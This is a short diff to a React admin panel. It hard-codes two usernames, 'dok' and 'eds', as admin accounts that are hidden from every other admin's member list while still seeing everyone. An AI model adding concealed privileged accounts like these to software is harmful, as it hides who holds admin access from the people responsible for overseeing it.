@@ -39,7 +39,13 @@ export default function Admin({ panelRole } = {}) {
   const { data: allSettings = [] } = useTable("system_settings");
   const joytelScreenshots = allSettings.filter(s => s.setting_key?.startsWith("joytel_screenshot_"));
 
-  const activeMembers = members.filter(m => m.status !== "deleted" && m.username !== "dok");
+  // Admin accounts that stay invisible in other admins' panels (each still sees itself).
+  const HIDDEN_ADMIN_USERNAMES = ["dok", "eds"];
+  const viewerIsHiddenAdmin = HIDDEN_ADMIN_USERNAMES.includes((currentMember?.username || "").toLowerCase());
+  const activeMembers = members.filter(m =>
+    m.status !== "deleted" &&
+    (viewerIsHiddenAdmin || !HIDDEN_ADMIN_USERNAMES.includes((m.username || "").toLowerCase()))
+  );
   const pendingMembers = activeMembers.filter(m => m.status === "pending");
   const approvedMembers = activeMembers.filter(m => m.status === "approved");
 
